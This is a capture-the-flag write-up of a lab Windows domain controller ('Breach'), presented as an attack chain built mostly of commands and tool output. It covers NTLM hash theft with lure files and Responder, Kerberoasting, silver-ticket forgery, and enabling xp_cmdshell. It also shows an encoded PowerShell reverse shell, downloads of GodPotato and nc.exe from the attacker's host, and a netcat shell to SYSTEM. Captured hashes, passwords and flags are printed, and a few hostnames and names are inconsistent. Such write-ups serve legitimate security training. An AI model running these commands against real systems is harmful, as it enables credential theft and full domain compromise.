---
tags:
  - HTB
  - Boot2Root
  - Hacking
  - Windows
  - GodPotato
  - SilverTicket
  - NTLM_Theft
---
# Overview

| Name        | Breach  |
| ----------- | ------- |
| OS          | Windows |
| Base Points | Medium  |
| Status      | Done    |

The User flag for this Box is located in a non-standard directory, C:\share\transfer.
# Recon
## Nmap

```bash
$ sudo nmap -sC -sV -T4 10.129.20.210
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-01-02 02:08 CST
Stats: 0:01:06 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 99.94% done; ETC: 02:10 (0:00:00 remaining)
Nmap scan report for 10.129.20.210
Host is up (0.25s latency).
Not shown: 987 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-01-02 08:09:06Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: breach.vl0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: breach.vl0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: BREACH
|   NetBIOS_Domain_Name: BREACH
|   NetBIOS_Computer_Name: BREACHDC
|   DNS_Domain_Name: breach.vl
|   DNS_Computer_Name: BREACHDC.breach.vl
|   Product_Version: 10.0.20348
|_  System_Time: 2026-01-02T08:09:21+00:00
| ssl-cert: Subject: commonName=BREACHDC.breach.vl
| Not valid before: 2025-09-07T08:04:48
|_Not valid after:  2026-03-09T08:04:48
|_ssl-date: 2026-01-02T08:10:00+00:00; -7s from scanner time.
Service Info: Host: BREACHDC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2026-01-02T08:09:24
|_  start_date: N/A
|_clock-skew: mean: -6s, deviation: 0s, median: -7s
```

```bash
10.129.20.210 BREACHDC.breach.htb breach.htb
```
# Enumeration

```bash
┌─[us-dedivip-1]─[10.10.15.108]─[at0mxploit@htb-zclxc6jlkl]─[~]
└──╼ [★]$ netexec smb BREACHDC.breach.htb -u 'guest' -p '' --shares 
SMB         10.129.20.210   445    BREACHDC         [*] Windows Server 2022 Build 20348 x64 (name:BREACHDC) (domain:breach.vl) (signing:True) (SMBv1:False)
SMB         10.129.20.210   445    BREACHDC         [+] breach.vl\guest: 
SMB         10.129.20.210   445    BREACHDC         [*] Enumerated shares
SMB         10.129.20.210   445    BREACHDC         Share           Permissions     Remark
SMB         10.129.20.210   445    BREACHDC         -----           -----------     ------
SMB         10.129.20.210   445    BREACHDC         ADMIN$                          Remote Admin
SMB         10.129.20.210   445    BREACHDC         C$                              Default share
SMB         10.129.20.210   445    BREACHDC         IPC$            READ            Remote IPC
SMB         10.129.20.210   445    BREACHDC         NETLOGON                        Logon server share 
SMB         10.129.20.210   445    BREACHDC         share           READ,WRITE      
SMB         10.129.20.210   445    BREACHDC         SYSVOL                          Logon server share 
SMB         10.129.20.210   445    BREACHDC         Users           READ        
```

```bash
┌─[us-dedivip-1]─[10.10.15.108]─[at0mxploit@htb-zclxc6jlkl]─[~]
└──╼ [★]$ smbclient -W breach.htb -U guest //BREACHDC.breach.htb/share
Password for [BREACH.HTB\guest]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Fri Jan  2 02:12:53 2026
  ..                                DHS        0  Tue Sep  9 05:35:32 2025
  finance                             D        0  Thu Feb 17 05:19:34 2022
  software                            D        0  Thu Feb 17 05:19:12 2022
  transfer                            D        0  Mon Sep  8 05:13:44 2025

		7863807 blocks of size 4096. 1505145 blocks available
smb: \> cd transfer
smb: \transfer\> dir
  .                                   D        0  Mon Sep  8 05:13:44 2025
  ..                                  D        0  Fri Jan  2 02:12:53 2026
  claire.pope                         D        0  Thu Feb 17 05:21:35 2022
  diana.pope                          D        0  Thu Feb 17 05:21:19 2022
  julia.wong                          D        0  Wed Apr 16 19:38:12 2025

		7863807 blocks of size 4096. 1504783 blocks available
smb: \transfer\> cd diana.pope\
smb: \transfer\diana.pope\> dir
NT_STATUS_ACCESS_DENIED listing \transfer\diana.pope\*
```

Since the share is writeable, we could try to steal their NTLM hash!
## NTLM Theft

We can git clone [NTLM_THEFT](https://github.com/Greenwolf/ntlm_theft?source=post_page-----0723409dcb7c---------------------------------------).

```bash
┌─[us-dedivip-1]─[10.10.15.108]─[at0mxploit@htb-zclxc6jlkl]─[~]
└──╼ [★]$ git clone https://github.com/Greenwolf/ntlm_theft
Cloning into 'ntlm_theft'...
remote: Enumerating objects: 151, done.
remote: Counting objects: 100% (38/38), done.
remote: Compressing objects: 100% (14/14), done.
remote: Total 151 (delta 31), reused 24 (delta 24), pack-reused 113 (from 1)
Receiving objects: 100% (151/151), 2.12 MiB | 2.83 MiB/s, done.
Resolving deltas: 100% (73/73), done.
┌─[us-dedivip-1]─[10.10.15.108]─[at0mxploit@htb-zclxc6jlkl]─[~]
└──╼ [★]$ cd ntlm_theft/
┌─[us-dedivip-1]─[10.10.15.108]─[at0mxploit@htb-zclxc6jlkl]─[~/ntlm_theft]
└──╼ [★]$ python3 ntlm_theft.py -g all -s 10.10.15.108 --filename testingFiles
Created: testingFiles/testingFiles.scf (BROWSE TO FOLDER)
Created: testingFiles/testingFiles-(url).url (BROWSE TO FOLDER)
Created: testingFiles/testingFiles-(icon).url (BROWSE TO FOLDER)
Created: testingFiles/testingFiles.lnk (BROWSE TO FOLDER)
Created: testingFiles/testingFiles.rtf (OPEN)
Created: testingFiles/testingFiles-(stylesheet).xml (OPEN)
Created: testingFiles/testingFiles-(fulldocx).xml (OPEN)
Created: testingFiles/testingFiles.htm (OPEN FROM DESKTOP WITH CHROME, IE OR EDGE)
Created: testingFiles/testingFiles-(handler).htm (OPEN FROM DESKTOP WITH CHROME, IE OR EDGE)
Created: testingFiles/testingFiles-(includepicture).docx (OPEN)
Created: testingFiles/testingFiles-(remotetemplate).docx (OPEN)
Created: testingFiles/testingFiles-(frameset).docx (OPEN)
Created: testingFiles/testingFiles-(externalcell).xlsx (OPEN)
Created: testingFiles/testingFiles.wax (OPEN)
Created: testingFiles/testingFiles.m3u (OPEN IN WINDOWS MEDIA PLAYER ONLY)
Created: testingFiles/testingFiles.asx (OPEN)
Created: testingFiles/testingFiles.jnlp (OPEN)
Created: testingFiles/testingFiles.application (DOWNLOAD AND OPEN)
Created: testingFiles/testingFiles.pdf (OPEN AND ALLOW)
Created: testingFiles/zoom-attack-instructions.txt (PASTE TO CHAT)
Created: testingFiles/testingFiles.library-ms (BROWSE TO FOLDER)
Created: testingFiles/Autorun.inf (BROWSE TO FOLDER)
Created: testingFiles/desktop.ini (BROWSE TO FOLDER)
Created: testingFiles/testingFiles.theme (THEME TO INSTALL
Generation Complete.
```

```bash
┌─[us-dedivip-1]─[10.10.15.108]─[at0mxploit@htb-zclxc6jlkl]─[~/ntlm_theft]
└──╼ [★]$ cd testingFiles/
┌─[us-dedivip-1]─[10.10.15.108]─[at0mxploit@htb-zclxc6jlkl]─[~/ntlm_theft/testingFiles]
└──╼ [★]$ smbclient //10.129.20.210/share -U guest%
Try "help" to get a list of possible commands.
smb: \> cd transfer\
smb: \transfer\> prompt off
smb: \transfer\> mput *
putting file testingFiles.library-ms as \transfer\testingFiles.library-ms (1.6 kb/s) (average 1.6 kb/s)
putting file testingFiles.m3u as \transfer\testingFiles.m3u (0.1 kb/s) (average 0.8 kb/s)
putting file testingFiles.jnlp as \transfer\testingFiles.jnlp (0.2 kb/s) (average 0.6 kb/s)
putting file Autorun.inf as \transfer\Autorun.inf (0.1 kb/s) (average 0.5 kb/s)
putting file desktop.ini as \transfer\desktop.ini (0.0 kb/s) (average 0.4 kb/s)
putting file testingFiles.asx as \transfer\testingFiles.asx (0.2 kb/s) (average 0.4 kb/s)
putting file testingFiles-(frameset).docx as \transfer\testingFiles-(frameset).docx (13.4 kb/s) (average 2.1 kb/s)
putting file testingFiles.htm as \transfer\testingFiles.htm (0.1 kb/s) (average 1.9 kb/s)
putting file testingFiles-(includepicture).docx as \transfer\testingFiles-(includepicture).docx (13.6 kb/s) (average 3.1 kb/s)
putting file testingFiles.lnk as \transfer\testingFiles.lnk (2.6 kb/s) (average 3.0 kb/s)
putting file testingFiles.wax as \transfer\testingFiles.wax (0.1 kb/s) (average 2.8 kb/s)
putting file testingFiles-(handler).htm as \transfer\testingFiles-(handler).htm (0.2 kb/s) (average 2.6 kb/s)
putting file testingFiles.pdf as \transfer\testingFiles.pdf (1.0 kb/s) (average 2.5 kb/s)
putting file testingFiles-(url).url as \transfer\testingFiles-(url).url (0.1 kb/s) (average 2.3 kb/s)
putting file testingFiles-(fulldocx).xml as \transfer\testingFiles-(fulldocx).xml (72.7 kb/s) (average 8.1 kb/s)
putting file testingFiles-(remotetemplate).docx as \transfer\testingFiles-(remotetemplate).docx (34.7 kb/s) (average 9.6 kb/s)
putting file testingFiles.rtf as \transfer\testingFiles.rtf (0.1 kb/s) (average 9.1 kb/s)
putting file testingFiles.theme as \transfer\testingFiles.theme (2.2 kb/s) (average 8.7 kb/s)
putting file testingFiles.application as \transfer\testingFiles.application (2.2 kb/s) (average 8.4 kb/s)
putting file testingFiles-(icon).url as \transfer\testingFiles-(icon).url (0.1 kb/s) (average 8.0 kb/s)
putting file testingFiles.scf as \transfer\testingFiles.scf (0.1 kb/s) (average 7.6 kb/s)
putting file testingFiles-(stylesheet).xml as \transfer\testingFiles-(stylesheet).xml (0.2 kb/s) (average 7.3 kb/s)
putting file zoom-attack-instructions.txt as \transfer\zoom-attack-instructions.txt (0.1 kb/s) (average 6.9 kb/s)
putting file testingFiles-(externalcell).xlsx as \transfer\testingFiles-(externalcell).xlsx (7.2 kb/s) (average 6.9 kb/s)
```

```bash
┌─[us-dedivip-1]─[10.10.15.108]─[at0mxploit@htb-zclxc6jlkl]─[~/krbrelayx/CVE-2024-22120-RCE]
└──╼ [★]$ sudo responder -I tun0
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR & MDNS Responder 3.1.3.0

  To support this project:
  Patreon -> https://www.patreon.com/PythonResponder
  Paypal  -> https://paypal.me/PythonResponder

  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
  To kill this script hit CTRL-C


[+] Poisoners:
    LLMNR                      [ON]
    NBT-NS                     [ON]
    MDNS                       [ON]
    DNS                        [ON]
    DHCP                       [OFF]

[+] Servers:
    HTTP server                [OFF]
    HTTPS server               [ON]
    WPAD proxy                 [OFF]
    Auth proxy                 [OFF]
    SMB server                 [ON]
    Kerberos server            [ON]
    SQL server                 [ON]
    FTP server                 [ON]
    IMAP server                [ON]
    POP3 server                [ON]
    SMTP server                [ON]
    DNS server                 [ON]
    LDAP server                [ON]
    RDP server                 [ON]
    DCE-RPC server             [ON]
    WinRM server               [ON]

[+] HTTP Options:
    Always serving EXE         [OFF]
    Serving EXE                [OFF]
    Serving HTML               [OFF]
    Upstream Proxy             [OFF]

[+] Poisoning Options:
    Analyze Mode               [OFF]
    Force WPAD auth            [OFF]
    Force Basic Auth           [OFF]
    Force LM downgrade         [OFF]
    Force ESS downgrade        [OFF]

[+] Generic Options:
    Responder NIC              [tun0]
    Responder IP               [10.10.15.108]
    Responder IPv6             [dead:beef:2::116a]
    Challenge set              [random]
    Don't Respond To Names     ['ISATAP']

[+] Current Session Variables:
    Responder Machine Name     [WIN-FZ5HU0BWMJW]
    Responder Domain Name      [0QQS.LOCAL]
    Responder DCE-RPC Port     [48651]

[+] Listening for events...

[SMB] NTLMv2-SSP Client   : 10.129.20.210
[SMB] NTLMv2-SSP Username : BREACH\Julia.Wong
[SMB] NTLMv2-SSP Hash     : Julia.Wong::BREACH:fa209f7105eecf0f:E9E18E0D7A8B012C7002FAD1B87A00D6:0101000000000000007FEAEF8D7BDC01AD7343820895F3750000000002000800300051005100530001001E00570049004E002D0046005A003500480055003000420057004D004A00570004003400570049004E002D0046005A003500480055003000420057004D004A0057002E0030005100510053002E004C004F00430041004C000300140030005100510053002E004C004F00430041004C000500140030005100510053002E004C004F00430041004C0007000800007FEAEF8D7BDC0106000400020000000800300030000000000000000100000000200000196D3BD20C8E7A6D4F569C6485E46A7DE6A4E03618F92B8263107646A7A4899F0A001000000000000000000000000000000000000900220063006900660073002F00310030002E00310030002E00310035002E003100300038000000000000000000
```

We get password `Computer1`.

```bash
$ bloodhound-python -u julia.wong -p 'Computer1' -d breach.vl -v --zip -c All -dc BREACHDC.breach.vl -ns 10.129.20.210
```

After the enumeration revealed an interesting service account `svc_mssql` with access to the SQL server.

![[1_I_5VsuW1XMZ-acGuRdRVcQ.webp]]

We see that there is a service account for the MSSQL server.

![[1_VbhB47OQXV5BrxXo6HoRQg.webp]]
## Service Account Exploitation

Using standard enumeration against the SQL server:

```bash
┌─[us-dedivip-1]─[10.10.15.108]─[at0mxploit@htb-zclxc6jlkl]─[~/htb]
└──╼ [★]$ impacket-GetUserSPNs breach.vl/julia.wong:'Computer1' -dc-ip 10.129.20.210 -request
Impacket v0.13.0.dev0+20250130.104306.0f4b866 - Copyright Fortra, LLC and its affiliated companies 

ServicePrincipalName              Name       MemberOf  PasswordLastSet             LastLogon                   Delegation 
--------------------------------  ---------  --------  --------------------------  --------------------------  ----------
MSSQLSvc/breachdc.breach.vl:1433  svc_mssql            2022-02-17 04:43:08.106169  2026-01-02 02:10:06.979121             



[-] CCache file is not found. Skipping...
$krb5tgs$23$*svc_mssql$BREACH.VL$breach.vl/svc_mssql*$b0ff9388bf7c45bcc7ea30e57b58892c$c00b7e2da1a940d95671cb329771eed5233ec478b78d8f1a5a1b77fc5b7b36d84b4a3343be8fc748e0552243a7deaa7f2bd66e9ed18026783d2eab556c84d120a269bbed9f4f8d87ef0482f814dcb414a4898b9520f402a211b98fd2b99cb4117f97f2c106bb3fb7c522bb9819ce24fd8d47a3edc56f236c27a518f64f2cc88244dbf31f49ba22e708cadbd7753fe243da03551d23781330817af914d721ab16905535d94e020305f91c21ef59ec5c330e64e0b0eb26d8b282067aec6c0a886fae684dfa69974b62c91823f29bfd22aadb2a85cb5cd4bae6d0f4719c2b1772ad446a608054c59ae677d0e25d5fba33edcdaca844a6f52889e2716d87af630ddb680c6cd693db614d6aa7976af5666bad801b8a6bb9a2de86c295d37926737e15cf6a90861fb90092191567a3671c20870e6273fac401cd6a15685b39d62e6526013cc5c0257c6cc324a1c04da78660d063dd4ad7d3d160104cf4b9c391af28b4cbfdf33d557b7b265e89d1ecea2a0cf0e991539189528335028e2d7445967ae1bc0f0ab5c055e230b207e19b69ca96cd4b1ff9636a618fe4e7fb14ba882e06404dcad79595edb953a8e53a384c67dc826b32341b76a1761efdae2d6c6112a35923c1af0e8fc5e6d1e0b9da0a51392e74b39d87b5c344179d1a55af2fb6fb2d5aafd858e9bd6c3d20e8c245db6922dbaf1f14bec786469eb78b747459c287b97057075d9129520ea487f1a67402c116f2c7e3067e3d3253fe9a48aad2bb77421431226651aeb39071165fc93bf0fd785a3bda11931696066d3f0c5ef9365206fab1f23a4662d032dc7c09040e806dd223a9fec70b6dcf28b06793b6f90fc98d41a389fd662763673e79712b029b9dd40f5d21a46ab108d1565a1c2a02126ed5eb01d7c7a04ac4966253697c246c08aab81d04ff296213fa7302e4e9951fef0c4a026831a4b99161950af01c3f4c7c651692d004bc62dbe11f3be8b4bcf900e7ce4211700c0988a7b9de8b6727aa26bf0b1e3b43e8ea6d4c21e4684f288bdf2d74850e626931457fc7bdfc4a86cb9cc850e6b62f608e23f7d68dbdd72f2ac628aef94db7f8a8dc4d091c7f44b6ea9b2222565b506723b7d6a55cd02157d6d025834362f8c080da1bb29ec20b8891ebf4ca34e213bb6608274ad2cc8dc71f61531d1c661c2fe85f63b11a56a95a60fd6f6bdcd65d566860cf35a6777e5d8e8361e86d207e1a075573d1e3e4f94008bd572c3074baab579fe5261073c919014069f3c801bab46aaef10e2ed1c29d0c81dba281dcb7404ade5658a0952670ffdb498ebc90d1c7b0794c3318e5700e75829a30e935464ae25d8111bad4853c229eb5d42c7f25c57d305f46d233333d35e85b289ca6a5ff7380fefc932e23259ce138ba0020ffb9c67a3ab5bb0208839e8c3802b660ad2fa7101eee32a39d4c3d7b203876649f843d9b80b2cf537afe2d0de2260802e945
```

We discovered that the `svc_mssql` account had Kerberoastable service principal names. After obtaining a TGS ticket, we cracked it to reveal the password: `Trustno1`

```bash
┌─[us-dedivip-1]─[10.10.15.108]─[at0mxploit@htb-zclxc6jlkl]─[~/htb]
└──╼ [★]$ impacket-mssqlclient svc_mssql@BREACHDC.breach.vl -windows-auth
Impacket v0.13.0.dev0+20250130.104306.0f4b866 - Copyright Fortra, LLC and its affiliated companies 

Password:
[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(BREACHDC\SQLEXPRESS): Line 1: Changed database context to 'master'.
[*] INFO(BREACHDC\SQLEXPRESS): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (150 7208) 
[!] Press help for extra shell commands
SQL (BREACH\svc_mssql  guest@master)> 
```

But we are not admin.
# Initial Foothold

## Kerberos Silver Ticket Attack

With the credentials for `svc_mssql`We enumerated the domain SID:

```bash
python3 /usr/share/doc/python3-impacket/examples/lookupsid.py breach.vl/svc_mssql:Trustno1@breachdc.breach.vl
```

This gave us the domain SID: `S-1-5-21-2330692793-3312915120-706255856`

We calculate the secret identifier (NT hash) for Kerberos signing:

```bash
iconv -f ASCII -t UTF-16LE <(printf 'Trustno1') | openssl dgst -md4
```

We then crafted a Silver Ticket targeting:

```bash
$ ticketer.py -nthash 69596c7aa1e8daee17f8e78870e25a5c -domain-sid S-1-5-21-2330692793-3312915120-706255856 -dc-ip 10.10.77.106 -spn mssql/breachdc.breach.vl -domain breach.vl Administrator
Impacket v0.13.0.dev0+20250130.104306.0f4b866 - Copyright Fortra, LLC and its affiliated companies 

[*] Creating basic skeleton ticket and PAC Infos
[*] Customizing ticket for breach.vl/Administrator
[*] 	PAC_LOGON_INFO
[*] 	PAC_CLIENT_INFO_TYPE
[*] 	EncTicketPart
[*] 	EncTGSRepPart
[*] Signing/Encrypting final ticket
[*] 	PAC_SERVER_CHECKSUM
[*] 	PAC_PRIVSVR_CHECKSUM
[*] 	EncTicketPart
[*] 	EncTGSRepPart
[*] Saving ticket in Administrator.ccache
┌─[us-dedivip-1]─[10.10.15.108]─[at0mxploit@htb-zclxc6jlkl]─[~/htb]
└──╼ [★]$ mssqlclient.py -k BREACHDC.breach.vl
Impacket v0.13.0.dev0+20250130.104306.0f4b866 - Copyright Fortra, LLC and its affiliated companies 

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(BREACHDC\SQLEXPRESS): Line 1: Changed database context to 'master'.
[*] INFO(BREACHDC\SQLEXPRESS): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (150 7208) 
[!] Press help for extra shell commands
SQL (BREACH\Administrator  dbo@master)> 
```

This allowed us to authenticate to the MSSQL server as the domain administrator Christine.Bruce.
# Privilege Escalation

Using the Kerberos ticket, we connected to the SQL server:

```bash
EXEC sp_configure 'show advanced options', 1;  
RECONFIGURE;  
EXEC sp_configure 'xp_cmdshell', 1;  
RECONFIGURE;
```

```bash
xp_cmdshell powershell -ec JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA1AC4AMQAwADgAIgAsADQANAA0ADQAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACIAPgAgACIAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA
```

```bash
┌─[us-dedivip-1]─[10.10.15.108]─[at0mxploit@htb-zclxc6jlkl]─[~/ntlm_theft]
└──╼ [★]$ nc -nlvp 4444
listening on [any] 4444 ...
connect to [10.10.15.108] from (UNKNOWN) [10.129.20.210] 56876

PS C:\Windows\system32> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeMachineAccountPrivilege     Add workstations to domain                Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeManageVolumePrivilege       Perform volume maintenance tasks          Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
PS C:\Windows\system32> 
```

We can use [Godpotato](https://github.com/BeichenDream/GodPotato/releases/download/V1.20/GodPotato-NET4.exe).

```bash
PS C:\Windows\Public> powershell -c "Invoke-WebRequest -Uri http://10.10.15.108:8000/GodPotato-NET4.exe -OutFile god.exe"
PS C:\Windows\Public> powershell -c "Invoke-WebRequest -Uri http://10.10.15.108:8000/nc.exe -OutFile nc.exe"
```

```bash
nc -nlvp 4445
```

```bash
.\god.exe -cmd "nc.exe -e powershell.exe 10.10.15.108 4445"
```

```bash
$ nc -nlvp 4445
listening on [any] 4445 ...
connect to [10.10.15.108] from (UNKNOWN) [10.129.20.210] 57055
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

Install the latest PowerShell for new features and improvements! https://aka.ms/PSWindows

PS C:\Users\Public> whoami
whoami
nt authority\system
PS C:\Users\Public> type C:\Users\Administrator\Desktop\root.txt
type C:\Users\Administrator\Desktop\root.txt
fc98f418f94f8cdb9a30ef026fe64345
PS C:\Users\Public> type C:\share\transfer\julia.wong\user.txt
type C:\share\transfer\julia.wong\user.txt
55d33e52bc5fa7a687b9f0dcfa103dda
```

---
